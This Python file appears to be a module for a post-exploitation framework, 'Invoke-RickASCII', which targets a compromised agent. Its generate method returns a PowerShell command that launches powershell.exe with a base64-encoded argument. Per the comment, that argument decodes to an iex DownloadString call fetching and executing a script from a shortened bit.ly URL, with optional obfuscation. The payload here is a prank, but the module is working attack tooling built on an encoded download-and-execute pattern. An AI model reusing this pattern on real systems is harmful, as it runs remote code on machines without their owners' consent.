from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-RickASCII',

            'Author': ['@lee_holmes', '@harmj0y'],

            'Description': ("Spawns a a new powershell.exe process that runs Lee Holmes' ASCII Rick Roll."),

            'Background' : False,

            'OutputExtension' : None,
            
            'NeedsAdmin' : False,

            'OpsecSafe' : False,

            'Language' : 'powershell',

            'MinLanguageVersion' : '2',
            
            'Comments': [
                "http://www.leeholmes.com/blog/2011/04/01/powershell-and-html5/"
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):
 
        # iex (New-Object Net.WebClient).DownloadString("http://bit.ly/e0Mw9w")
        script = "$Null = Start-Process -WindowStyle Maximized -FilePath \"C:\Windows\System32\WindowsPowerShell\\v1.0\powershell.exe\" -ArgumentList \"-enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AYgBpAHQALgBsAHkALwBlADAATQB3ADkAdwAiACkA\"; 'Client Rick-Asciied!'"
        if obfuscate:
            script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
        return script
